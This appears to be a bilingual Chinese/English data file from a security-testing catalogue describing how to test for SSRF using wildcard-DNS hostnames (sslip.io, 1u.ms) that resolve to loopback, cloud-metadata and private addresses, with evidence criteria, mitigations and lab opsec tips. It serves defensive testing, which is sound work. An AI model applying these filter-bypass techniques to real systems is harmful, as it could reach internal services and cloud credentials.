exploitation.zh: 离线查询 A/AAAA 和 TTL，记录嵌入地址与实际结果，再由应用请求一个固定标记路径并捕获最终连接 IP。 受控内网服务日志和 HTTP 客户端连接地址必须一致；DNS 成功、HTTP 状态差异或第三方首页都不能证明 SSRF。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Query A/AAAA and TTL offline, compare embedded and actual addresses, then have the application request one fixed marker path and capture the final IP. Controlled internal-service logs and the HTTP client's connected address must agree; DNS success, status differences, or a third-party landing page do not prove SSRF. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 对解析后的所有地址执行网段阻断，避免基于字符串后缀允许 URL，并在每次重定向和 DNS 刷新后重新校验。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Block disallowed ranges across all resolved addresses, avoid string-suffix URL approval, and revalidate after each redirect and DNS refresh. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: sslip.io 通配 DNS SSRF 目标

description.zh: 使用 sslip.io 的嵌入 IP 主机名解析到回环、元数据和私网地址，验证 DNS 后地址分类。
description.en: Uses sslip.io hostnames with embedded IPs that resolve to loopback, metadata, and private addresses to test post-DNS classification.

subCategory.zh: sslip.io 通配 DNS 解析

prerequisites.zh: 已独立查询 sslip.io 的 A/AAAA 与 TTL，不沿用 nip.io 的行为假设。

prerequisites.en: An isolated environment has a nonsensitive marker service at the embedded IP and can distinguish server requests from local browser requests.

opsecTips.zh: 首次确认服务端连接后停止，不测试该列表中的云元数据路径或其他真实内部服务。
opsecTips.en: Stop after the first confirmed server connection and do not test the list's cloud metadata paths or other real internal services.

opsecTips.en: Flush test DNS caches, close the internal marker port, and remove the unique token from proxy and application logs.

title.en: Confirm the sslip.io Wildcard-DNS Resolution boundary

description.en: This service is independent from nip.io, so caching, TTL, and IPv4 embedding rules require separate observation rather than assuming identical behavior. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

description.en: Resolve the current DNS answer, choose one controlled loopback port, and compare original host, resolved IP, and connected destination with a unique token. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

name.zh: 1u.ms 编码地址 DNS SSRF 目标

description.zh: 使用域名标签同时携带点分地址与十六进制地址，验证主机字符串检查是否忽略最终 DNS 目标。
description.en: Uses host labels containing both dotted and hexadecimal address forms to test whether hostname checks ignore the final DNS destination.

prerequisites.zh: 当前 1u.ms 对点分地址与十六进制标签的解析已通过独立 DNS 工具核对。
prerequisites.en: Verify current 1u.ms handling of dotted addresses and hexadecimal labels with an independent DNS tool.

prerequisites.zh: 使用一个受控目标地址，且可观察服务端校验值、DNS 答案和最终连接三者。
prerequisites.en: Use one controlled target address and observe the server's validated value, DNS answer, and final connection.

title.zh: 1u.ms 通配符DNS
title.en: Validation step 1 for 1u.ms Encoded-Address DNS SSRF Targets

description.zh: 1u.ms 通配符DNS包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this 1u.ms Encoded-Address DNS SSRF Targets validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性是编码外观域名通过字符串校验，但解析结果属于禁止网段并被应用连接。域名格式包含十六进制、DNS 返回 NXDOMAIN/多地址、或离线换算出内网 IP而没有 socket 连接都属假阳性。

opsecTips.zh: 确认一个编码域名到达受控服务后停止，不对六个样例逐个打真实地址。

opsecTips.zh: 删除测试 DNS 查询记录中的内部地址，清除解析/连接缓存并关闭标记监听器。
opsecTips.en: Remove internal addresses from test DNS records, clear resolver and connection caches, and close the marker listener.

title.zh: 确认编码地址通配 DNS适用边界
title.en: Confirm the Encoded-Address Wildcard DNS boundary

description.zh: 六个样例分别指向回环、链路本地和 RFC 1918 地址；外部服务行为可能变化，需先独立解析并留存 TTL。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: The six samples target loopback, link-local, and RFC 1918 ranges; resolve independently and record TTL because external service behavior can change. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控编码地址通配 DNS样例
